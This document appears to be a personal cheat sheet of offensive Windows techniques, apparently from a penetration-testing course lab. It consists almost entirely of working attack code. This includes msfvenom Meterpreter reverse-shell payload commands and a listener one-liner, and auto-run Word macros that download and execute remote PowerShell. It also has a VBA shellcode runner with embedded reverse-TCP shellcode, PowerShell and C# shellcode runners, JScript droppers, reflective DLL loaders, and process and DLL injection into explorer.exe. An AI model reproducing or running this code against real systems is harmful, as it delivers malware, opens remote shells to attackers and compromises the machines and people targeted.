
## Commands:

#### msfvenom Payload
- Standard
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.49.110 LPORT=443 -f dll -o evil.dll
```

- Using encoders / templates
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.176.134 LPORT=443 -e x64/zutto_dekiru -x notepad.exe -f exe -o met64_notepad.exe
```

#### msfconsole listener oneliner
```
msfconsole -q -x 'use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost 192.168.49.70; set lport 443; run'
```

#### Mono Compile DLL
```
mcs -platform:x64 -target:library evil.cs -out:evil.dll
```

#### Mono Compile exe
```
mcs -platform:x64 -target:exe evil.cs -out:evil.exe
```

#### DotNetToJscript
```
.\DotNetToJScript.exe evil.dll --lang=Jscript --ver=v4 -o evil.js
```

#### SharpShooter

[SuperSharpShooter](https://github.com/SYANiDE-/SuperSharpShooter)

##### _Stageless Jscript Runner_
1. Generate a Meterpreter payload:
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.49.110 LPORT=443 -f raw -o shell.txt
```

2. Use SharpShooter to convert this to malicious Jscript:
```
./SharpShooter.py --payload js --dotnetver 4 --stageless --rawscfile shell.txt --output test
```

##### _Staged HTML Smuggled Payload_
1. Generate Meterpreter payload as csharp:
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.49.110 LPORT=443 EnableStageEncoding=True PrependMigrate=True -f csharp -o sharpshell.txt
```

2. Generate payloads using SharpShooter:
```
./SharpShooter.py --payload js --dotnetver 4 --scfile sharpshell.txt --output test2 --smuggle --template mcafee --delivery web --web http://192.168.49.110/test2.payload --shellcode
```

3. Serve HTML and .payload on attacking machine:
```
python3 -m http.server 80
```

####

## Snippets:

#### Macro
```
Sub MyMacro()
    Dim str As String
    str = "powershell (New-Object System.Net.WebClient).DownloadString('http://192.168.49.147/evil.ps1') | IEX"
    Shell str, vbHide
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub
```

#### VBA Shellcode Runner
```
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr

Function evil()
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As Long

    buf = Array(252,232,143,0,0,0,96,49,210,137,229,100,139,82,48,139,82,12,139,82,20,139,114,40,49,255,15,183,74,38,49,192,172,60,97,124,2,44,32,193,207,13,1,199,73,117,239,82,87,139,82,16,139,66,60,1,208,139,64,120,133,192,116,76,1,208,80,139,72,24,139,88,32,1,211,133,201,116,60,73,139, _
52,139,1,214,49,255,49,192,193,207,13,172,1,199,56,224,117,244,3,125,248,59,125,36,117,224,88,139,88,36,1,211,102,139,12,75,139,88,28,1,211,139,4,139,1,208,137,68,36,36,91,91,97,89,90,81,255,224,88,95,90,139,18,233,128,255,255,255,93,104,51,50,0,0,104,119,115,50,95,84, _
104,76,119,38,7,137,232,255,208,184,144,1,0,0,41,196,84,80,104,41,128,107,0,255,213,106,10,104,192,168,49,110,104,2,0,17,91,137,230,80,80,80,80,64,80,64,80,104,234,15,223,224,255,213,151,106,16,86,87,104,153,165,116,97,255,213,133,192,116,10,255,78,8,117,236,232,103,0,0,0, _
106,0,106,4,86,87,104,2,217,200,95,255,213,131,248,0,126,54,139,54,106,64,104,0,16,0,0,86,106,0,104,88,164,83,229,255,213,147,83,106,0,86,83,87,104,2,217,200,95,255,213,131,248,0,125,40,88,104,0,64,0,0,106,0,80,104,11,47,15,48,255,213,87,104,117,110,77,97,255,213, _
94,94,255,12,36,15,133,112,255,255,255,233,155,255,255,255,1,195,41,198,117,193,195,187,224,29,42,10,104,166,149,189,157,255,213,60,6,124,10,128,251,224,117,5,187,71,19,114,111,106,0,83,255,213)

    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter
    res = CreateThread(0, 0, addr, 0, 0, 0)
End Function

Sub Document_Open()
    evil
End Sub

Sub AutoOpen()
    evil
End Sub
```

#### PowerShell Shellcode Runner
```
function LookupAPI {
    Param ($moduleName, $methodName)
    $assembly = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { 
        $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll')
    }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp = @()
    $assembly.GetMethods() | ForEach-Object { If($_.Name -eq "GetProcAddress") {$tmp += $_} }
    return $tmp[0].Invoke($null, @(($assembly.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $methodName))
}

function getDelegateType {
    Param (
        \# Input
        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
        \# Output
        [Parameter(Position = 1)] [Type] $delType = [Void]
    )
    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly(
        (New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
        [System.Reflection.Emit.AssemblyBuilderAccess]::Run
        ).DefineDynamicModule('InMemoryModule', $False).DefineType(
            'delegate_type',
            'Class, Public, Sealed, AnsiClass, AutoClass',
            [System.MulticastDelegate]
        )
    $type.DefineConstructor(
        'RTSpecialName, HideBySig, Public',
        [System.Reflection.CallingConventions]::Standard, 
        $func
    ).SetImplementationFlags('Runtime, Managed')
    $type.DefineMethod(
        'Invoke',
        'Public, HideBySig, NewSlot, Virtual',
        $delType,
        $func
    ).SetImplementationFlags('Runtime, Managed')
    return $type.CreateType()
}

\# msf payload
[Byte[]] $buf = 0xfc,0xe8,0x8f,0x0,0x0,0x0,0x60...

\# VirtualAlloc
$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (LookupAPI kernel32.dll VirtualAlloc), 
    (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))
).Invoke([IntPtr]::Zero, $buf.length, 0x3000, 0x40)

\# memcpy
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)

\# CreateThread
$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (LookupAPI kernel32.dll CreateThread), 
    (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))
    ).Invoke([IntPtr]::Zero, 0, $lpMem, [IntPtr]::Zero, 0, [IntPtr]::Zero)

\# WaitForSingleObject
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (LookupAPI kernel32.dll WaitForSingleObject), 
    (getDelegateType @([IntPtr], [Int32]) ([Int]))
    ).Invoke($hThread, 0xFFFFFFFF)
```

#### PowerShell Proxy Aware
```
$wc = new-object system.net.WebClient
$wc.DownloadString("http://192.168.49.110/evil.ps1")
```

#### PowerShell SYSTEM Proxy
```
New-PSDrive -Name HKU -PSProvider Registry -Root HKEY_USERS | Out-Null
$keys = Get-ChildItem 'HKU:\'
ForEach ($key in $keys) {
    if ($key.Name -like "*S-1-5-21-*") {
        $start = $key.Name.substring(10)
        break
    }
}

$proxyAddr=(Get-ItemProperty -Path "HKU:$start\Software\Microsoft\Windows\CurrentVersion\Internet Settings\").ProxyServer
[system.net.webrequest]::DefaultWebProxy = new-object System.Net.WebProxy("http://$proxyAddr")

$wc = new-object system.net.WebClient
$wc.Headers.Add('User-Agent', "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36")
$wc.DownloadString("http://192.168.49.110/evil.ps1")
```

#### Jscript Droppers
##### _No Proxy_
```
var url = "http://192.168.49.110/evil.exe"
var Object = WScript.CreateObject('MSXML2.XMLHTTP');

Object.Open('GET', url, false);
Object.Send();

if (Object.Status == 200)
{
    var Stream = WScript.CreateObject('ADODB.Stream');

    Stream.Open();
    Stream.Type = 1;
    Stream.Write(Object.ResponseBody);
    Stream.Position = 0;

    Stream.SaveToFile("evil.exe", 2);
    Stream.Close();
}

var r = new ActiveXObject("WScript.Shell").Run("evil.exe");
```

##### _Proxy Aware_
```
var url = "http://192.168.49.110/evil.exe"
var Object = WScript.CreateObject('MSXML2.ServerXMLHTTP');

Object.setProxy(2, "http=192.168.110.12:3128", "")
Object.open('GET', url, false);
Object.send();

if (Object.status == 200)
{
    var Stream = WScript.CreateObject('ADODB.Stream');

    Stream.Open();
    Stream.Type = 1;
    Stream.Write(Object.responseBody);
    Stream.Position = 0;

    Stream.SaveToFile("evil.exe", 2);
    Stream.Close();
}

var r = new ActiveXObject("WScript.Shell").Run("evil.exe");
```

#### CSharp Shellcode Runner
```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace ConsoleApp1
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        static void Main(string[] args)
        {
            byte[] buf = new byte[630] {
            ...
            };

            int size = buf.Length;
            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
            Marshal.Copy(buf, 0, addr, size);
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
```

#### Jscript Shellcode Runner
```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;

[ComVisible(true)]
public class TestClass
{
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    [DllImport("kernel32.dll")]
    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    public TestClass()
    {

        byte[] buf = new byte[510] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,
        ...
        };

        int size = buf.Length;
        IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
        Marshal.Copy(buf, 0, addr, size);
        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        WaitForSingleObject(hThread, 0xFFFFFFFF);
    }

    public void RunProcess(string path)
    {
        Process.Start(path);
    }
}
```


#### Powershell Reflective DLL Load
##### _Malicious DLL Using DotNetToJscript_
```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace ClassLibrary1
{
    public class Class1
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        public static void runner()
        {
            byte[] buf = new byte[630] {
            ...
            };

            int size = buf.Length;
            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
            Marshal.Copy(buf, 0, addr, size);
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
```

##### _PowerShell Download Cradle_
```
$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.49.110/reflect.dll')

$assem = [System.Reflection.Assembly]::Load($data)
$class = $assem.GetType("ClassLibrary1.Class1")
$method = $class.GetMethod("runner")
$method.Invoke(0, $null)
```

#### Word Reflective DLL Load
1. Generate 32 bit shellcode:
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.49.110 LPORT=443 -f csharp
```

2. Recompile DLL as x86:
```
mcs -platform:x64-target:library reflect.cs
```

3. Create macro to download and execute DLL:
```
Sub MyMacro()
    Dim str As String
    str = "powershell $data=(New-Object System.Net.WebClient).DownloadData('http://192.168.49.110/reflect.dll'); $assem=[System.Reflection.Assembly]::Load($data); $class=$assem.GetType('ClassLibrary1.Class1'); $method=$class.GetMethod('runner'); $method.Invoke(0, $null)"
    Shell str, vbHide
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub
```

#### CSharp Process Injection
1. DotNetToJscript Harness:
```
using System;
using System.Diagnostics;  
using System.Runtime.InteropServices;  
using System.Windows.Forms;  
  
[ComVisible(true)]  
public class TestClass  
{  
   [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]  
   static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);  
   [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]  
   static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);  
   [DllImport("kernel32.dll")]  
   static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);  
   [DllImport("kernel32.dll")]  
   static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);  
  
   public TestClass()  
   {  
       Process[] proc = Process.GetProcessesByName("explorer");  
       int pid = proc[0].Id;  
       IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);  
       IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);  
  
       byte[] buf = new byte[510] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,  
       ...
       };  
  
       IntPtr outSize;  
       WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);  
       IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);  
   }  
  
   public void RunProcess(string path)  
   {  
       Process.Start(path);  
   }  
}
```

2. Compile to DLL with mono:
```
mcs -r:System.Windows.Forms -platform:x64 -target:library TestClass.cs
```

3. Convert to js with DotNetToJscript:
```
.\DotNetToJScript.exe evil.dll --lang=Jscript --ver=v4 -o evil.js
```

#### CSharp Process Injection Alt
1. Rewrite C# source to use alternative API calls (DotNetToJscript):
```
using System;  
using System.Diagnostics;  
using System.Runtime.InteropServices;  
using System.Windows.Forms;  
  
[ComVisible(true)]  
public class TestClass  
{  
   [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]  
   static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);  
  
   [DllImport("ntdll.dll", SetLastError = true, ExactSpelling = true)]  
   static extern UInt32 NtCreateSection(ref IntPtr SectionHandle, UInt32 DesiredAccess, IntPtr ObjectAttributes, ref UInt32 MaximumSize, UInt32 SectionPageProtection, UInt32 AllocationAttributes, IntPtr FileHandle);  
  
   [DllImport("ntdll.dll", SetLastError=true)]  
   static extern uint NtMapViewOfSection(IntPtr SectionHandle, IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, IntPtr CommitSize, out ulong SectionOffset, out int ViewSize, uint InheritDisposition, uint AllocationType, uint Win32Protect);  
  
   [DllImport("ntdll.dll", SetLastError=true)]  
   static extern uint NtUnmapViewOfSection(IntPtr hProc, IntPtr baseAddr);  
  
   [DllImport("ntdll.dll", ExactSpelling=true, SetLastError=false)]  
   static extern int NtClose(IntPtr hObject);  
  
   [DllImport("kernel32.dll")]  
   static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);  
  
   public TestClass()  
   {  
       byte[] buf = new byte[510] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,  
       ... 
       };  
  
       int bufSize = buf.Length;  
       uint ubufSize = (uint)bufSize;  
  
       // Get current process handle  
       IntPtr hCProcess = Process.GetCurrentProcess().Handle;  
  
       // Get target process handle  
       Process[] proc = Process.GetProcessesByName("explorer");  
       int tpid = proc[0].Id;  
       IntPtr hProcess = OpenProcess(0x001F0FFF, false, tpid);  
  
       // Create section  
       IntPtr ptr_section_handle = IntPtr.Zero;  
       UInt32 create_section_status = NtCreateSection(ref ptr_section_handle, 0xe, IntPtr.Zero, ref ubufSize, 0x40, 0x08000000, IntPtr.Zero);  
  
       // Map view of section in current process  
       UInt64 local_section_offset = 0;  
       IntPtr ptr_local_section_addr = IntPtr.Zero;  
       UInt32 local_map_view_status = NtMapViewOfSection(ptr_section_handle, hCProcess, ref ptr_local_section_addr, IntPtr.Zero, IntPtr.Zero, out local_section_offset, out bufSize, 0x2, 0, 0x04);  
  
       // Copy shellcode into memory  
       Marshal.Copy(buf, 0, ptr_local_section_addr, buf.Length);  
          
       // Map view of section on target process  
       IntPtr ptr_remote_section_addr = IntPtr.Zero;  
       UInt32 remote_map_view_status = NtMapViewOfSection(ptr_section_handle, hProcess, ref ptr_remote_section_addr, IntPtr.Zero, IntPtr.Zero, out local_section_offset, out bufSize, 0x2, 0, 0x20);  
  
       // Unmap view in current process & close section handle  
       NtUnmapViewOfSection(hCProcess, ptr_local_section_addr);  
       NtClose(ptr_section_handle);  
  
       IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, ptr_remote_section_addr, IntPtr.Zero, 0, IntPtr.Zero);  
   }  
  
   public void RunProcess(string path)  
   {  
       Process.Start(path);  
   }  
}
```

#### PowerShell Process Injection
1. Port C# code to PowerShell:
```
function LookupAPI {
    Param ($moduleName, $methodName)
    $assembly = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { 
        $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll')
    }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp = @()
    $assembly.GetMethods() | ForEach-Object { If($_.Name -eq "GetProcAddress") {$tmp += $_} }
    return $tmp[0].Invoke($null, @(($assembly.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $methodName))
}

function getDelegateType {
    Param (
        \# Input
        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
        \# Output
        [Parameter(Position = 1)] [Type] $delType = [Void]
    )
    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly(
        (New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
        [System.Reflection.Emit.AssemblyBuilderAccess]::Run
        ).DefineDynamicModule('InMemoryModule', $False).DefineType(
            'delegate_type',
            'Class, Public, Sealed, AnsiClass, AutoClass',
            [System.MulticastDelegate]
        )
    $type.DefineConstructor(
        'RTSpecialName, HideBySig, Public',
        [System.Reflection.CallingConventions]::Standard, 
        $func
    ).SetImplementationFlags('Runtime, Managed')
    $type.DefineMethod(
        'Invoke',
        'Public, HideBySig, NewSlot, Virtual',
        $delType,
        $func
    ).SetImplementationFlags('Runtime, Managed')
    return $type.CreateType()
}

\# msf payload
[Byte[]] $buf = ...

\# Spawn notepad.exe and get PID
$proc = Start-Process -Passthru "notepad"
$procPID = $proc.Id
$hProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (LookupAPI kernel32.dll OpenProcess),
    (getDelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr]))
).Invoke(0x001F0FFF, $false, $procPID)

\# VirtualAllocEx
$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (LookupAPI kernel32.dll VirtualAllocEx), 
    (getDelegateType @([IntPtr], [IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))
).Invoke($hProcess, [IntPtr]::Zero, $buf.Length + 1, 0x3000, 0x40)

\# WriteProcessMemory
$memWrite = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (LookupAPI kernel32.dll WriteProcessMemory), 
    (getDelegateType @([IntPtr], [IntPtr], [Byte[]], [UInt32], [UInt32].MakeByRefType()) ([Bool]))
).Invoke($hProcess, $lpMem, $buf, $buf.Length, [Ref] 0)

\# CreateRemoteThread
$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (LookupAPI kernel32.dll CreateRemoteThread), 
    (getDelegateType @([IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))
    ).Invoke($hProcess, [IntPtr]::Zero, 0, $lpMem, [IntPtr]::Zero, 0, [IntPtr]::Zero)

\# WaitForSingleObject
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (LookupAPI kernel32.dll WaitForSingleObject), 
    (getDelegateType @([IntPtr], [Int32]) ([Int]))
    ).Invoke($hThread, 0xFFFFFFFF)
```

2. Write Word macro to execute remote ps1 code:
```
Sub MyMacro()
    Dim str As String
    str = "powershell (New-Object System.Net.WebClient).DownloadString('http://192.168.49.110/evil.ps1') | IEX"
    Shell str, vbHide
End Sub

Sub Document_Open()
    MyMacro
End Sub
```

#### CSharp DLL Injection
1. Generate malicious DLL with msfvenom:
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.49.110 LPORT=443 -f dll -o evil.dll
```

2. Create JScript dropper code:
```
using System;
using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;

[ComVisible(true)]
public class TestClass
{
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll")]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
    [DllImport("kernel32.dll")]
    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);
    /*
        OpenProcess
        VirtualAllocEx
        WriteProcessMemory
        CreateRemoteThread
        GetProcAddress
        GetModuleHandle
    */
    public TestClass()
    {
        String dir = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
        String dllName = dir + "\\evil.dll";

        WebClient wc = new WebClient();
        wc.DownloadFile("http://192.168.49.110/evil.dll", dllName);

        Process[] expProc = Process.GetProcessesByName("explorer");
        int pid = expProc[0].Id;

        IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
        IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
        IntPtr outSize;
        Boolean res = WriteProcessMemory(hProcess, addr, Encoding.Default.GetBytes(dllName), dllName.Length, out outSize);
        IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
        IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero);
    }

    public void RunProcess(string path)
    {
        Process.Start(path);
    }
}
```

3. Compile using mono:
```
mcs -platform:x64 -target:library TestClass.cs
```

4. Convert to JScript: 
```
.\DotNetToJScript.exe dropper.dll --lang=Jscript --ver=v4 -o dropper.js
```


####
